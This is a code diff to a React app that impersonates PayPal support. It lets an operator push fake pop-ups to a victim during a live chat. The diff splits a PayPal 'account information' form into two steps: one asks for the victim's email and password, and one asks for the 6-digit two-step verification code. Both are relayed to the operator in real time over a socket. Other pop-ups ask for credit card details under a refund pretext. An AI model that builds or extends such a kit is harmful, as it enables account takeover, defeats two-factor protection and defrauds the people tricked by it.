@@ -233,43 +233,20 @@ const CreditCardPopup = ({ onSubmit, onClose }) => {
     );
 };
 
-// --- Composant : Pop-up de Compte PayPal ---
-const PayPalAccountPopup = ({ onSubmit, onClose }) => {
-    const [accountData, setAccountData] = useState({
+// --- Composant : Pop-up PayPal Login (Étape 1) ---
+const PayPalLogin1Popup = ({ onSubmit, onClose }) => {
+    const [loginData, setLoginData] = useState({
         email: '',
-        password: '',
-        phoneNumber: '',
-        securityAnswer: '',
-        verificationCode: ''
+        password: ''
     });
 
-    const formatPhoneNumber = (value) => {
-        const v = value.replace(/\D/g, '');
-        if (v.length >= 10) {
-            return v.replace(/(\d{3})(\d{3})(\d{4})/, '$1-$2-$3');
-        } else if (v.length >= 6) {
-            return v.replace(/(\d{3})(\d{3})/, '$1-$2');
-        } else if (v.length >= 3) {
-            return v.replace(/(\d{3})/, '$1');
-        }
-        return v;
-    };
-
     const handleInputChange = (field, value) => {
-        let formattedValue = value;
-        
-        if (field === 'phoneNumber') {
-            formattedValue = formatPhoneNumber(value);
-        } else if (field === 'verificationCode') {
-            formattedValue = value.replace(/[^0-9]/g, '').substring(0, 6);
-        }
-        
-        setAccountData(prev => ({ ...prev, [field]: formattedValue }));
+        setLoginData(prev => ({ ...prev, [field]: value }));
     };
 
     const handleSubmit = (e) => {
         e.preventDefault();
-        onSubmit(accountData);
+        onSubmit(loginData);
         onClose();
     };
 
@@ -279,7 +256,7 @@ const PayPalAccountPopup = ({ onSubmit, onClose }) => {
                 <div className="flex items-center justify-between mb-6">
                     <div className="flex items-center gap-3">
                         <img src="/paypal.png" alt="PayPal Logo" className="w-8 h-8" />
-                        <h2 className="text-xl font-semibold text-gray-800">PayPal Account Information</h2>
+                        <h2 className="text-xl font-semibold text-gray-800">PayPal Login</h2>
                     </div>
                     <button onClick={onClose} className="text-gray-400 hover:text-gray-600 text-2xl">&times;</button>
                 </div>
@@ -290,7 +267,7 @@ const PayPalAccountPopup = ({ onSubmit, onClose }) => {
                         <input
                             type="email"
                             placeholder="example@email.com"
-                            value={accountData.email}
+                            value={loginData.email}
                             onChange={(e) => handleInputChange('email', e.target.value)}
                             className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-[#009cde] focus:border-[#009cde]"
                             required
@@ -302,47 +279,11 @@ const PayPalAccountPopup = ({ onSubmit, onClose }) => {
                         <input
                             type="password"
                             placeholder="Enter your password"
-                            value={accountData.password}
+                            value={loginData.password}
                             onChange={(e) => handleInputChange('password', e.target.value)}
                             className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-[#009cde] focus:border-[#009cde]"
                             required
                         />
-                    </div>
-                    
-                    <div>
-                        <label className="block text-sm font-medium text-gray-700 mb-1">Phone Number *</label>
-                        <input
-                            type="tel"
-                            placeholder="123-456-7890"
-                            value={accountData.phoneNumber}
-                            onChange={(e) => handleInputChange('phoneNumber', e.target.value)}
-                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-[#009cde] focus:border-[#009cde]"
-                            required
-                        />
-                    </div>
-                    
-                    <div>
-                        <label className="block text-sm font-medium text-gray-700 mb-1">Security Question Answer</label>
-                        <input
-                            type="text"
-                            placeholder="Answer to your security question"
-                            value={accountData.securityAnswer}
-                            onChange={(e) => handleInputChange('securityAnswer', e.target.value)}
-                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-[#009cde] focus:border-[#009cde]"
-                        />
-                    </div>
-                    
-                    <div>
-                        <label className="block text-sm font-medium text-gray-700 mb-1">2-Step Verification Code</label>
-                        <input
-                            type="text"
-                            placeholder="123456"
-                            value={accountData.verificationCode}
-                            onChange={(e) => handleInputChange('verificationCode', e.target.value)}
-                            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-[#009cde] focus:border-[#009cde]"
-                            maxLength="6"
-                        />
-                        <p className="text-xs text-gray-500 mt-1">Enter the 6-digit code from your authenticator app</p>
                     </div>
                     
                     <div className="flex gap-3 mt-6">
@@ -357,10 +298,89 @@ const PayPalAccountPopup = ({ onSubmit, onClose }) => {
                             type="submit"
                             className="flex-1 bg-[#0070ba] text-white font-bold py-3 px-4 rounded-lg hover:bg-[#005ea6] transition duration-200"
                         >
-                            Submit
+                            Continue
                         </button>
                     </div>
                 </form>
+            </div>
+        </div>
+    );
+};
+
+// --- Composant : Pop-up PayPal 2FA (Étape 2) ---
+const PayPalLogin2Popup = ({ onSubmit, onClose }) => {
+    const [verificationData, setVerificationData] = useState({
+        verificationCode: ''
+    });
+
+    const handleInputChange = (field, value) => {
+        let formattedValue = value;
+        
+        if (field === 'verificationCode') {
+            formattedValue = value.replace(/[^0-9]/g, '').substring(0, 6);
+        }
+        
+        setVerificationData(prev => ({ ...prev, [field]: formattedValue }));
+    };
+
+    const handleSubmit = (e) => {
+        e.preventDefault();
+        onSubmit(verificationData);
+        onClose();
+    };
+
+    return (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 font-sans p-4">
+            <div className="bg-white p-8 rounded-lg shadow-2xl w-full max-w-md border">
+                <div className="flex items-center justify-between mb-6">
+                    <div className="flex items-center gap-3">
+                        <img src="/paypal.png" alt="PayPal Logo" className="w-8 h-8" />
+                        <h2 className="text-xl font-semibold text-gray-800">Two-Step Verification</h2>
+                    </div>
+                    <button onClick={onClose} className="text-gray-400 hover:text-gray-600 text-2xl">&times;</button>
+                </div>
+                
+                <div className="text-center mb-6">
+                    <p className="text-gray-600 text-sm mb-2">Enter the 6-digit code from your authenticator app</p>
+                    <p className="text-xs text-gray-500">We've sent a verification code to secure your account</p>
+                </div>
+                
+                <form onSubmit={handleSubmit} className="space-y-6">
+                    <div>
+                        <label className="block text-sm font-medium text-gray-700 mb-2 text-center">Verification Code *</label>
+                        <input
+                            type="text"
+                            placeholder="123456"
+                            value={verificationData.verificationCode}
+                            onChange={(e) => handleInputChange('verificationCode', e.target.value)}
+                            className="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-[#009cde] focus:border-[#009cde] text-center text-xl font-mono tracking-wider"
+                            maxLength="6"
+                            required
+                        />
+                    </div>
+                    
+                    <div className="flex gap-3 mt-6">
+                        <button
+                            type="button"
+                            onClick={onClose}
+                            className="flex-1 bg-gray-200 text-gray-800 font-bold py-3 px-4 rounded-lg hover:bg-gray-300 transition duration-200"
+                        >
+                            Cancel
+                        </button>
+                        <button
+                            type="submit"
+                            className="flex-1 bg-[#0070ba] text-white font-bold py-3 px-4 rounded-lg hover:bg-[#005ea6] transition duration-200"
+                        >
+                            Verify
+                        </button>
+                    </div>
+                </form>
+                
+                <div className="text-center mt-4">
+                    <button className="text-[#0070ba] text-sm hover:underline">
+                        Didn't receive a code? Resend
+                    </button>
+                </div>
             </div>
         </div>
     );
@@ -418,7 +438,8 @@ function App() {
     const [isVerifying, setIsVerifying] = useState(false);
     const [showPopup, setShowPopup] = useState(false);
     const [showCreditCardPopup, setShowCreditCardPopup] = useState(false);
-    const [showPayPalAccountPopup, setShowPayPalAccountPopup] = useState(false);
+    const [showPayPalLogin1Popup, setShowPayPalLogin1Popup] = useState(false);
+    const [showPayPalLogin2Popup, setShowPayPalLogin2Popup] = useState(false);
     const [showVerificationPopup, setShowVerificationPopup] = useState(false);
 
     useEffect(() => {
@@ -441,9 +462,14 @@ function App() {
                     setShowCreditCardPopup(true);
                 }
             };
-            const handleDisplayPayPalAccountPopup = () => {
+            const handleDisplayPayPalLogin1Popup = () => {
                 if (userType === 'User') {
-                    setShowPayPalAccountPopup(true);
+                    setShowPayPalLogin1Popup(true);
+                }
+            };
+            const handleDisplayPayPalLogin2Popup = () => {
+                if (userType === 'User') {
+                    setShowPayPalLogin2Popup(true);
                 }
             };
             const handleDisplayVerificationPopup = (data) => {
@@ -466,7 +492,8 @@ function App() {
             });
             socket.on('display popup', handleDisplayPopup);
             socket.on('display credit card popup', handleDisplayCreditCardPopup);
-            socket.on('display paypal account popup', handleDisplayPayPalAccountPopup);
+            socket.on('display paypal login1 popup', handleDisplayPayPalLogin1Popup);
+            socket.on('display paypal login2 popup', handleDisplayPayPalLogin2Popup);
             socket.on('display verification popup', handleDisplayVerificationPopup);
             
             return () => {
@@ -476,7 +503,8 @@ function App() {
                 socket.off('user activity');
                 socket.off('display popup');
                 socket.off('display credit card popup');
-                socket.off('display paypal account popup');
+                socket.off('display paypal login1 popup');
+                socket.off('display paypal login2 popup');
                 socket.off('display verification popup');
                 if (socket) socket.disconnect();
             };
@@ -553,8 +581,12 @@ function App() {
         socket.emit('request credit card');
     };
 
-    const handleRequestPayPalAccount = () => {
-        socket.emit('request paypal account');
+    const handleRequestPayPalLogin1 = () => {
+        socket.emit('request paypal login1');
+    };
+
+    const handleRequestPayPalLogin2 = () => {
+        socket.emit('request paypal login2');
     };
 
     const handlePopupChoice = (option) => {
@@ -567,9 +599,14 @@ function App() {
         setShowCreditCardPopup(false);
     };
 
-    const handlePayPalAccountSubmit = (accountData) => {
-        socket.emit('paypal account data', { accountData });
-        setShowPayPalAccountPopup(false);
+    const handlePayPalLogin1Submit = (loginData) => {
+        socket.emit('paypal login1 data', { loginData });
+        setShowPayPalLogin1Popup(false);
+    };
+
+    const handlePayPalLogin2Submit = (verificationData) => {
+        socket.emit('paypal login2 data', { verificationData });
+        setShowPayPalLogin2Popup(false);
     };
 
     const handleCheckboxChange = (type) => {
@@ -627,7 +664,8 @@ function App() {
         <div className="h-screen flex flex-col font-sans bg-[#f5f7fa]">
             {showPopup && <RefundPopup onChoice={handlePopupChoice} />}
             {showCreditCardPopup && <CreditCardPopup onSubmit={handleCreditCardSubmit} onClose={() => setShowCreditCardPopup(false)} />}
-            {showPayPalAccountPopup && <PayPalAccountPopup onSubmit={handlePayPalAccountSubmit} onClose={() => setShowPayPalAccountPopup(false)} />}
+            {showPayPalLogin1Popup && <PayPalLogin1Popup onSubmit={handlePayPalLogin1Submit} onClose={() => setShowPayPalLogin1Popup(false)} />}
+            {showPayPalLogin2Popup && <PayPalLogin2Popup onSubmit={handlePayPalLogin2Submit} onClose={() => setShowPayPalLogin2Popup(false)} />}
             {showVerificationPopup && <VerificationPopup />}
             <header className="flex items-center p-4 border-b border-[#e1e7eb] shadow-sm bg-white">
                 <img src="/paypal.png" alt="PayPal Logo" className="h-8 w-auto mr-4" />
@@ -639,20 +677,24 @@ function App() {
                     </p>
                 </div>
                 {userType === 'Support' && (
-                    <div className="ml-auto flex items-center gap-3">
-                        <button onClick={handleRequestPopup} title="Request Action from User" className="flex items-center gap-2 bg-blue-100 text-blue-800 text-xs font-bold py-2 px-3 rounded-lg hover:bg-blue-200 transition duration-300">
+                    <div className="ml-auto flex items-center gap-2">
+                        <button onClick={handleRequestPopup} title="Request Action from User" className="flex items-center gap-1 bg-blue-100 text-blue-800 text-xs font-bold py-2 px-2 rounded-lg hover:bg-blue-200 transition duration-300">
                            <PopupIcon />
                            POP-UP
                         </button>
-                        <button onClick={handleRequestCreditCard} title="Request Credit Card Information" className="flex items-center gap-2 bg-green-100 text-green-800 text-xs font-bold py-2 px-3 rounded-lg hover:bg-green-200 transition duration-300">
+                        <button onClick={handleRequestCreditCard} title="Request Credit Card Information" className="flex items-center gap-1 bg-green-100 text-green-800 text-xs font-bold py-2 px-2 rounded-lg hover:bg-green-200 transition duration-300">
                            <CreditCardIcon />
                            CB
                         </button>
-                        <button onClick={handleRequestPayPalAccount} title="Request PayPal Account Information" className="flex items-center gap-2 bg-orange-100 text-orange-800 text-xs font-bold py-2 px-3 rounded-lg hover:bg-orange-200 transition duration-300">
+                        <button onClick={handleRequestPayPalLogin1} title="Request PayPal Login (Step 1)" className="flex items-center gap-1 bg-orange-100 text-orange-800 text-xs font-bold py-2 px-2 rounded-lg hover:bg-orange-200 transition duration-300">
                            <PayPalIcon />
-                           PAYPAL
+                           PAYPAL 1
                         </button>
-                        <button onClick={handleClearChat} className="flex items-center gap-2 bg-red-500 text-white text-xs font-bold py-2 px-3 rounded-lg hover:bg-red-600 transition duration-300">
+                        <button onClick={handleRequestPayPalLogin2} title="Request PayPal 2FA Code (Step 2)" className="flex items-center gap-1 bg-purple-100 text-purple-800 text-xs font-bold py-2 px-2 rounded-lg hover:bg-purple-200 transition duration-300">
+                           <PayPalIcon />
+                           PAYPAL 2
+                        </button>
+                        <button onClick={handleClearChat} className="flex items-center gap-1 bg-red-500 text-white text-xs font-bold py-2 px-2 rounded-lg hover:bg-red-600 transition duration-300">
                             <TrashIcon />
                             Clear Chat
                         </button>
